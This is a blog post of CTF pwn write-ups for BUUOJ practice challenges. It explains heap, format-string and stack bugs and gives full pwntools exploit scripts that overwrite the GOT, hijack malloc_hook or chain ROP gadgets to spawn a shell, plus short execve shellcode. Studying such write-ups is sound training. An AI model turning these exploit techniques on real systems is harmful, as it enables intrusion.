---
layout: post
title: buuoj刷刷题(pwn)
subheading: 学学pwn
author: xyccq
categories: pwn
tags: pwn

---



## babyfengshui_33c3_2016

![](https://xyccq.github.io/assets/images/typora-user-images/image-20210826171715164.png)

漏洞所在处，判断是否越界，用description的起始地址加上输入的长度，如果判断大于name起始地址-4（去掉size段）。即溢出。

![image-20210826172406015](https://xyccq.github.io/assets/images/typora-user-images/image-20210826172406015.png)

存储形式，红框为description的chunk，其余为name的chunk。蓝框为description的起始地址，随后才是name的内容。

正常情况下这样的判断溢出的方式没有问题，但是如果add时，令description从bin中申请，而name则申请新的空间，那么description和name的chunk就不再相邻，而他们之间的部分都可以进行溢出。

exp:

```python
from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
p = process('./baby')
p = remote('node4.buuoj.cn', 25530)
elf = ELF('./baby')
#libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
free_got = elf.got['free']
def add(size, name, text_length, text):
	p.recvuntil('Action: ')
	p.sendline('0')
	p.recvuntil('size of description: ')
	p.sendline(size)
	p.recvuntil('name: ')
	p.sendline(name)
	p.recvuntil('text length: ')
	p.sendline(text_length)
	p.recvuntil('text: ')
	p.sendline(text)
	
	
def delete(index):
	p.recvuntil('Action: ')
	p.sendline('1')
	p.recvuntil('index: ')
	p.sendline(index)
	
def show(index):
	p.recvuntil('Action: ')
	p.sendline('2')
	p.recvuntil('index: ')
	p.sendline(index)

def edit(index, text_length, text):
	p.recvuntil('Action: ')
	p.sendline('3')
	p.recvuntil('index: ')
	p.sendline(index)
	p.recvuntil('text length: ')
	p.sendline(text_length)
	p.recvuntil('text: ')
	p.sendline(text)
add('32', 'chunk1', '32', 'a'*0x20)
add('32', 'chunk2', '32', 'a'*0x20)
add('32', 'chunk3', '32', '/bin/sh\x00')
delete('0')

payload = 'a'*0x80 + p32(0) + p32(0) + 'a'*0x20 + p32(0) + p32(0) + p32(free_got) + '\x00'
add('128', 'chun4',str(len(payload)), payload)
show('1')
p.recvuntil('description: ')
free_addr = u32(p.recv(4))
libc = LibcSearcher('free', free_addr)
libc_base = free_addr - libc.dump('free')
sys_addr = libc_base + libc.dump('system')
edit('1', '4', p32(sys_addr))
delete('2')
p.interactive()
```







## [ZJCTF 2019]EasyHeap

hitcontraining_magicheap的改进版

![image-20210826235002399](https://xyccq.github.io/assets/images/typora-user-images/image-20210826235002399.png)

菜单界面，当输入4869，且$magic>=4869$​​时调用l33t函数。

![image-20210826235833641](https://xyccq.github.io/assets/images/typora-user-images/image-20210826235833641.png)

edit函数中可以重新设置输入的size，那么就可以溢出了。从而控制fastbin中chunk的fd指针。

magic在bss段，可以通过house of spirit在magic前找到能够制造fake chunk的地方，制造了fake chunk后对其进行edit修改magic值。（也可通过unsorted bin attack来修改）

![image-20210826235728646](https://xyccq.github.io/assets/images/typora-user-images/image-20210826235728646.png)

这里可以，并且可以看到magic是0。

exp

```python
from pwn import *
context.log_level = 'debug'

#p = process('./easyheap')
p = remote('node4.buuoj.cn', 29050)
heap_array = 0x6020e0
leet = 0x400c23
def add(size, content):
	p.recvuntil('Your choice :')
	p.sendline('1')
	p.recvuntil('Size of Heap : ')
	p.sendline(str(size))
	p.recvuntil('Content of heap:')
	p.sendline(content)
	
def edit(size, index, content):
	p.recvuntil('Your choice :')
	p.sendline('2')
	p.recvuntil('Index :')
	p.sendline(str(index))
	p.recvuntil('Size of Heap : ')
	p.sendline(str(size))
	p.recvuntil('Content of heap : ')
	p.sendline(content)
	
def delete(index):
	p.recvuntil('Your choice :')
	p.sendline('3')
	p.recvuntil('Index :')
	p.sendline(str(index))

def leet():
	p.recvuntil('Your choice :')
	p.sendline('4869')
	p.recv()

add(0x10, 'teapot')
add(0x10, 'a'*0x10)
add(0x60, 'b'*0x10)
pause()
delete(2)
payload1 = b'e'*0x10 + p64(0) + p64(0x71) + p64(0x6020ad)
edit(len(payload1), 1, payload1)
add(0x60, 'c'*(0x60))
add(0x60, 'a'*(0x6020c0-0x6020ad-0x10)+p32(0xffff))
leet()
p.recv()
p.recv()
p.recv()
```
Unsorted Bin Attack版
```python
add(0x10, 'c'*0x10)
add(0x80, 'b'*0x10)
add(0x10, 'a'*0x10)

delete(1)
payload = 'a'*0x10 + p64(0) + p64(0x91) + p64(0) + p64(magic-0x10)
edit(len(payload), 0, payload)
add(0x80, 'teapot')
```

![image-20210827000220767](https://xyccq.github.io/assets/images/typora-user-images/image-20210827000220767.png)



没有这个文件，虚晃一枪。

换一种思路，修改got表，将heaparray中某一个改为free_got，那么直接edit，将free_got地址的值改为system_plt，那么调用free函数就相当于调用system。

新增一个chunk，内容"/bin/sh\x00"，之后free掉这个chunk就相当于system("\bin\sh")。

exp

```python
from pwn import *
context.log_level = 'debug'

p = process('./easyheap')
elf = ELF('./easyheap')
sys_plt = elf.plt['system']
sys_got = elf.got['system']
free_got = elf.got['free']
p = remote('node4.buuoj.cn', 29050)
heap_array = 0x6020e0
leet = 0x400c23
def add(size, content):
	p.recvuntil('Your choice :')
	p.sendline('1')
	p.recvuntil('Size of Heap : ')
	p.sendline(str(size))
	p.recvuntil('Content of heap:')
	p.sendline(content)
	
def edit(size, index, content):
	p.recvuntil('Your choice :')
	p.sendline('2')
	p.recvuntil('Index :')
	p.sendline(str(index))
	p.recvuntil('Size of Heap : ')
	p.sendline(str(size))
	p.recvuntil('Content of heap : ')
	p.send(content)
	
def delete(index):
	p.recvuntil('Your choice :')
	p.sendline('3')
	p.recvuntil('Index :')
	p.sendline(str(index))

def leet():
	p.recvuntil('Your choice :')
	p.sendline('4869')
	p.recv()

add(0x10, '/bin/sh\x00')
add(0x10, 'a'*0x10)
add(0x60, 'b'*0x10)
delete(2)
payload1 = b'e'*0x10 + p64(0) + p64(0x71) + p64(0x6020ad)
edit(len(payload1), 1, payload1)
add(0x60, 'c'*(0x60))
add(0x60, 'a'*(0x602100-0x6020ad-0x10)+p64(free_got))
edit(8, 4, p64(sys_plt))
add(0x10, '/bin/sh\x00')
pause()
delete(6)
p.interactive()
```



## ciscn_2019_n_3

delete的时候指针没有置0，UAF，将题中free函数改为system的plt即可

got表可写

```python
from pwn import *
context.log_level = 'debug'

#p = process('./ciscn_2019_n_3')
p = remote('node4.buuoj.cn', 28073)
elf = ELF('./ciscn_2019_n_3')

sys_plt = elf.plt['system']

def add(index, Type, size, value):
	p.recvuntil('CNote > ')
	p.sendline('1')
	p.recvuntil('Index > ')
	p.sendline(str(index))
	p.recvuntil('Type > ')
	p.sendline(str(Type))
	if Type == 2:
		p.recvuntil('Length > ')
		p.sendline(str(size))
	p.recvuntil('Value > ')
	p.sendline(str(value))
	
def dele(index):
	p.recvuntil('CNote > ')
	p.sendline('2')
	p.recvuntil('Index > ')
	p.sendline(str(index))

def show(index):
	p.recvuntil('CNote > ')
	p.sendline('3')
	p.recvuntil('Index > ')
	p.sendline(str(index))

add(0, 2, 20, 'teapot')
pause()
add(1, 1, 1, 10)
dele(0)
dele(1)
add(2, 2, 0xc, 'sh\x00\x00' + p32(sys_plt))
dele(0)
p.interactive()
```



## roarctf_2019_easy_pwn

（做到后面发现这题是个缝合怪， 0ctf_2017_babyheap的加强版）

off-by-one漏洞造成chunk overlapping

Unsorted Bin Leak泄露libc

fastbin attack修改malloc_hook为one_gadget

```python
from pwn_debug import *
context.log_level = 'debug'
pdbg = pwn_debug('./roarctf')

#pdbg.local("/home/xyc/libc/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so", "/home/xyc/libc/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so")
#pdbg.debug('2.27')
pdbg.remote('node4.buuoj.cn', 25102, "./s/libc-2.23_x64.so")

p = pdbg.run('remote')
libc = pdbg.libc

one_gadget = [0x45226, 0x4526a]


def add(size):
	p.recvuntil('choice: ')
	p.sendline('1')
	p.recvuntil('size: ')
	p.sendline(str(size))

def write(index, size, content):
	p.recvuntil('choice: ')
	p.sendline('2')
	p.recvuntil('index: ')
	p.sendline(str(index))
	p.recvuntil('size: ')
	p.sendline(str(size))
	p.recvuntil('content: ')
	p.sendline(content)

def delete(index):
	p.recvuntil('choice: ')
	p.sendline('3')
	p.recvuntil('index: ')
	p.sendline(str(index))

def show(index):
	p.recvuntil('choice: ')
	p.sendline('4')
	p.recvuntil('index: ')
	p.sendline(str(index))

add(0x18) # 0
add(0x18) # 1
add(0xa8) # 2
add(0x18) # 3
write(0, 0x18+10, b'a'*(0x18) + b'\xd1')

delete(1)
add(0xc8)
write(1, 0x20, b'a'*(0x10) + p64(0) + p64(0xb1))
delete(2)

show(1)
p.recvuntil('content: ')
p.recv(0x20)
addr = u64(p.recv(0x8))
print(hex(addr))
main_arena_offset = libc.symbols["__malloc_hook"] + 0x10 + 88
print(hex(main_arena_offset))
libc_addr = addr - main_arena_offset

malloc_hook = libc_addr + libc.symbols['__malloc_hook']
realloc = libc_addr + libc.symbols['__libc_realloc']

add(0xa8) # 2
add(0x18) # 4
add(0x68) # 5
add(0x18) # 6
write(3, 0x18+10, b'a'*(0x18) + b'\x91')
delete(4)
add(0x88) # 4
huifuw = b'a'*0x10 + p64(0) + p64(0x71)
write(4, len(huifuw), huifuw)
delete(5)
payload = b'a'*0x10 + p64(0) + p64(0x71) + p64(malloc_hook-0x23)
write(4, len(payload), payload)
add(0x68) # 5
add(0x68) # 7 fake_chunk
print(hex(addr))
print(hex(libc_addr))
print(hex(malloc_hook))
print(hex(libc_addr + one_gadget[1]))
payload2 = b'a'*(0x13-8) + p64(libc_addr + one_gadget[1]) + p64(realloc+16)
write(7, len(payload2), payload2)
pause()
add(0x18)
p.interactive()
```

one_gadget条件不满足时，通过relloc的trick调整。（待补充）



## axb_2019_fmt32

```python
from pwn_debug import *
from LibcSearcher import *
context.log_level = 'debug'

pdbg = pwn_debug('./axb_2019_fmt32')

#pdbg.debug("2.23")
#pdbg.local()
pdbg.remote('node4.buuoj.cn', 26952, "/home/xyc/share/s/libc-2.23_x86.so")

p = pdbg.run('remote')
libc = pdbg.libc
elf = pdbg.elf
p.recv()
read_got = elf.got['read']
payload = 'a' + p32(read_got) + '%8$s'
p.sendline(payload)
p.recvuntil('Repeater:a' + p32(read_got))
read_addr = u32(p.recv(4))
print(hex(read_addr))

setoff = read_addr - 0x0d4350
one_gadget = setoff + 0x3a812
payload1 = 'a' + fmtstr_payload(8, {read_got: one_gadget},write_size = "byte",numbwritten = 0xa)
p.sendline(payload1)
p.sendline('cat flag')
p.interactive()
```



## wustctf2020_getshell_2

栈溢出

```python
from pwn_debug import *
context.log_level = 'debug'

pdbg = pwn_debug('./wustctf2020_getshell_2')

pdbg.local('/home/xyc/share/s/libc-2.23_x86.so')
pdbg.remote('node4.buuoj.cn', 26170)

p = pdbg.run('remote')
sys = 0x08048529
sh = 0x08048670
payload = b'a'*(0x18+0x4) + p32(sys) + p32(sh)
p.sendline(payload)
p.interactive()
```



## hitcontraining_magicheap

[ZJCTF 2019]EasyHeap弱化版

方法同unsorted bin attack

```python
from pwn_debug import *
context.log_level = 'debug'

p = process(['/home/xyc/libc/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so','./magicheap'],env={"LD_PRELOAD":"/home/xyc/libc/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so"})
#p = remote('node4.buuoj.cn', 25492)
elf = ELF('./magicheap')

def add(size, content):
	p.recvuntil('Your choice :')
	p.sendline('1')
	p.recvuntil('Size of Heap : ')
	p.sendline(str(size))
	p.recvuntil('Content of heap:')
	p.sendline(content)

def edit(index, size, content):
	p.recvuntil('Your choice :')
	p.sendline('2')
	p.recvuntil('Index :')
	p.sendline(str(index))
	p.recvuntil('Size of Heap : ')
	p.sendline(str(size))
	p.recvuntil('Content of heap : ')
	p.sendline(content)
	
def delete(index):
	p.recvuntil('Your choice :')
	p.sendline('3')
	p.recvuntil('Index :')
	p.sendline(str(index))

magic = elf.symbols['magic']
print(hex(magic))
add(0x10, 'a'*(0x10))
add(0x80, 'b'*0x10)
add(0x10, 'c'*(0x10))

delete(1)
payload = 'a'*0x10 + p64(0) + p64(0x91) + p64(0) + p64(magic-0x10)
edit(0, len(payload), payload)
add(0x80, 'teapot')
p.sendline('4869')
p.interactive()
	
```



## ciscn_2019_s_4

栈迁移，网上部分师傅wp中的示意图是错的，建议自己动手调试调试。

可参考：[[原创\]栈迁移原理（图示）-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com](https://bbs.pediy.com/thread-258030.htm)

```python
from pwn_debug import *
context.log_level = 'debug'

p = process('./ciscn_s_4')
p = remote('node4.buuoj.cn', 27158)
elf = ELF('./ciscn_s_4')

sys_addr = elf.symbols['system']
print(hex(sys_addr))

p.recv()
payload = 'a'*(0x24) + 'b'*4
p.send(payload)
p.recvuntil('bbbb')
buf = u32(p.recv(4).ljust(4, '\x00'))-0x38
print(hex(buf))
payload2 = p32(sys_addr) + 'aaaa' + p32(buf+12) + '/bin/sh\x00'
payload2 = payload2.ljust(0x28, 'a')
payload2 += p32(buf-4) + p32(0x080485FD)

p.send(payload2)
p.interactive()

```



## others_babystack

```python
from pwn_debug import *
context.log_level = 'debug'

pdbg = pwn_debug('./babystack')

pdbg.local("/home/xyc/libc/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so", "/home/xyc/libc/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so")
pdbg.remote("node4.buuoj.cn", 27362 ,"/home/xyc/share/s/libc-2.23_x64.so")

p = process(['/home/xyc/libc/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so','./babystack'],env={"LD_PRELOAD":"/home/xyc/libc/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so"})
elf = ELF('./babystack')
libc = ELF("/home/xyc/libc/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so")
#libc = pdbg.libc
#elf = pdbg.elf

pop_rdi = 0x400a93
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main_addr = 0x400908
def store(content):
	p.recvuntil('>> ')
	p.sendline('1')
	p.sendline(content)

def print1():
	p.recvuntil('>> ')
	p.sendline('2')
	
payload1 = 'a'*(0x80) + 'b'*8
store(payload1)

print1()
p.recvuntil('bbbbbbbb\n')
canary = u64(p.recv(7).rjust(8, '\x00'))
print(hex(canary))
payload2 = 'a'*(0x90-0x8) + p64(canary) + p64(0) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
store(payload2)
p.recv()
p.sendline('3')
puts_addr = u64(p.recv(6).ljust(8, '\x00'))

libc_addr = puts_addr - libc.symbols['puts']
sys_addr = libc_addr + libc.symbols['system']
bin_addr = libc_addr + libc.search('/bin/sh').next()
payload3 = 'a'*(0x90-0x8) + p64(canary) + p64(0) + p64(pop_rdi) + p64(bin_addr) + p64(sys_addr) + p64(main_addr)
store(payload3)
p.sendline('3')
p.interactive()

```



## pwnable_start

```python
from pwn_debug import *
context.log_level = 'debug'
pdbg = pwn_debug('./start')
write = 0x8048087
pdbg.local()
pdbg.remote('node4.buuoj.cn', 26472)
#p = process('./start')
p = pdbg.run('remote')
p.recvuntil('CTF:')
payload1 = 'a'*(0x14) + p32(write)
p.send(payload1)
stack = u32(p.recv(4))
print(hex(stack))
shellcode = asm(
	"""
	push   0xb
	pop    eax
	push   ebx
	push   0x0068732f
	push   0x6e69622f
	mov    ebx,esp
	xor    ecx,ecx
	xor    edx,edx
	int    0x80
	"""
)
payload2 = 'a'*(0x14) + p32(stack+0x14) + shellcode
p.send(payload2)
p.interactive()
```

短shellcode

i386

```assembly
push   0xb
pop    eax
push   ebx
push   0x68732f2f
push   0x6e69622f
mov    ebx,esp
int    0x80
```

x64

```assembly
xor 	rsi,	rsi			
push	rsi				
mov 	rdi,	0x68732f2f6e69622f	 
push	rdi
push	rsp		
pop	    rdi				
mov 	al,	59			
cdq					
syscall
```



## 0ctf_2017_babyheap

弱化版roarctf_2019_easy_pwn

```python
from pwn_debug import *
context.log_level = 'debug'

pdbg = pwn_debug('./0ctf_2017_babyheap')
pdbg.local("/home/xyc/libc/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so", "/home/xyc/libc/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so")
pdbg.remote("node4.buuoj.cn", 29955, "/home/xyc/share/s/libc-2.23_x64.so")

p = pdbg.run('local')
libc = pdbg.libc
elf = pdbg.elf

one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147, 0x4527a]

def add(size):
	p.recvuntil('Command: ')
	p.sendline('1')
	p.recvuntil('Size: ')
	p.sendline(str(size))

def fill(index, size, content):
	p.recvuntil('Command: ')
	p.sendline('2')
	p.recvuntil('Index: ')
	p.sendline(str(index))
	p.recvuntil('Size: ')
	p.sendline(str(size))
	p.recvuntil('Content: ')
	p.send(content)

def free(index):
	p.recvuntil('Command: ')
	p.sendline('3')
	p.recvuntil('Index: ')
	p.sendline(str(index))

def show(index):
	p.recvuntil('Command: ')
	p.sendline('4')
	p.recvuntil('Index: ')
	p.sendline(str(index))
	
	
add(0x10)  #0
add(0x10)  #1
add(0x80)  #2
add(0x10)  #3
payload1 = 'a'*(0x10) + p64(0) + p64(0xb1)
fill(0, len(payload1), payload1)
free(1)
add(0xa0) #1(has2)
fill(1, 0x20, 'a'*0x10 + p64(0) + p64(0x91))
free(2)
show(1)
p.recvuntil('Content: ')
p.recv(0x21)
main_arena_addr = u64(p.recv(6).ljust(8, '\x00')) - 88
print(hex(main_arena_addr))
offset = libc.symbols['__malloc_hook'] + 0x10
libc_addr = main_arena_addr - offset

malloc_hook = libc_addr + libc.symbols['__malloc_hook']
add(0x80) #2
add(0x10) #4
add(0x10) #5
add(0x60) #6
payload2 = 'a'*(0x10) + p64(0) + p64(0x91)
fill(4, len(payload2), payload2)
free(5)
add(0x80) #5(has6)
fill(5, 0x20, 'a'*(0x10) + p64(0) + p64(0x71))
free(6)
payload3 = 'a'*(0x10) + p64(0) + p64(0x71) + p64(malloc_hook-0x23)
fill(5, len(payload3), payload3)
add(0x60) #6
add(0x60) #7(malloc)
fill(7, 0x13+0x8, 'a'*(0x13) + p64(libc_addr + one_gadget[4]))
add(0x10)
p.interactive()

```



## hitcontraining_heapcreator

off-by-one制造chunk over lapping

```python
from pwn_debug import *
context.log_level = 'debug'

pdbg = pwn_debug('./heapcreator')

#pdbg.local("/home/xyc/libc/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so", "/home/xyc/libc/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so")
pdbg.remote("node4.buuoj.cn", 26356, "/home/xyc/share/s/libc-2.23_x64.so")

p = pdbg.run("remote")
elf = pdbg.elf
libc = pdbg.libc

#p = process(['/home/xyc/libc/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so','./heapcreator'],env={"LD_PRELOAD":"/home/xyc/libc/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so"})
#elf = ELF('./heapcreator')
#libc = ELF('/home/xyc/libc/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')

heaparray = 0x6020a0
setoff = 0x13

def add(size, content):
	p.recvuntil("Your choice :")
	p.send('1')
	p.recvuntil("Size of Heap : ")
	p.send(str(size))
	p.recvuntil("Content of heap:")
	p.send(content)

def edit(index, content):
	p.recvuntil("Your choice :")
	p.send('2')
	p.recvuntil("Index :")
	p.send(str(index))
	p.recvuntil("Content of heap : ")
	p.send(content)

def show(index):
	p.recvuntil("Your choice :")
	p.send('3')
	p.recvuntil("Index :")
	p.send(str(index))

def delete(index):
	p.recvuntil("Your choice :")
	p.send('4')
	p.recvuntil("Index :")
	p.send(str(index))

free_got = elf.got['free']
add(0x18, 'aaaa') #0
add(0x18, 'bbbb') #1
add(0x18, 'cccc') #2
add(0x18, '/bin/sh') #3

edit(0, 'a'*0x18+'\x81')
delete(1)
add(0x70, 'dddd') #1(has2)
edit(1, p64(0)*7+p64(0x21)+p64(0x8) + p64(free_got))
pause()
show(2)
p.recvuntil('Content : ')
free_addr = u64(p.recv(6).ljust(8, '\x00'))
libc_addr = free_addr - libc.symbols['free']
sys_addr = libc_addr + libc.symbols['system']

edit(2, p64(sys_addr))
delete(3)
p.interactive()

```



## wustctf2020_closed

![image-20210905234341275](https://xyccq.github.io/assets/images/typora-user-images/image-20210905234341275.png)

关了1（标准输出）和2（标准错误），因此及时getshell了也看不见输出。

```c
exec 1>&0
```

通过exec 1>&0来把标准输出重定向到文件描述符0(标准输入)

![image-20210905234610322](https://xyccq.github.io/assets/images/typora-user-images/image-20210905234610322.png)



## hitcon2014_stkof

unlink将heaparray[2]指向heaparray[0]从而控制堆指针

修改free_got为puts_plt，heaparray[1]为puts_got，从而free(1)以泄露libc地址

修改atoi_got为system，send(p64(bin_addr))

getshell

```python
from pwn_debug import *
context.log_level = 'debug'

pdbg = pwn_debug('./stkof')
pdbg.remote("node4.buuoj.cn", 26584, "/home/xyc/share/s/libc-2.23_x64.so")
p = pdbg.run('remote')
libc = pdbg.libc
elf = pdbg.elf

#p = process(['/home/xyc/libc/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so','./stkof'],env={"LD_PRELOAD":"/home/xyc/libc/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so"})
#libc = ELF("/home/xyc/libc/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so")
#elf = ELF("./stkof")

def add(size):
	p.sendline('1')
	p.sendline(str(size))
	p.recvuntil("OK\n")
	
def edit(index, size, content):
	p.sendline('2')
	p.sendline(str(index))
	p.sendline(str(size))
	p.send(content)
	p.recvuntil("OK\n")

def delete(index):
	p.sendline('3')
	p.sendline(str(index))
	
def show(index):
	p.sendline('4')
	p.sendline(str(index))

heaparray = 0x602140
add(0x20) #1
add(0x30) #2
add(0x80) #3


payload = p64(0) + p64(0x20) + p64(heaparray+0x10-0x18) + p64(heaparray+0x10-0x10) + p64(0x20) + 'aaaaaaaa' + p64(0x30) + p64(0x90)
edit(2, len(payload), payload)


delete(3)
p.recvuntil("OK\n")


free_got = elf.got['free']
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
atoi_got = elf.got['atoi']
payload = 'a'*(0x8) + p64(free_got) + p64(puts_got) + p64(atoi_got)

edit(2, len(payload), payload)
payload = p64(puts_plt)
edit(0, len(payload), payload)
delete(1)

puts_addr = u64(p.recv(6).ljust(8, '\x00'))
libc_addr = puts_addr - libc.symbols['puts']
sys_addr = libc_addr + libc.symbols['system']
bin_addr = libc_addr + libc.search('/bin/sh').next()
log.success('libc base: ' + hex(libc_addr))
log.success('/bin/sh addr: ' + hex(bin_addr))
log.success('system addr: ' + hex(sys_addr))
payload = p64(sys_addr)
edit(2, len(payload), payload)
p.send(p64(bin_addr))
p.interactive()
```

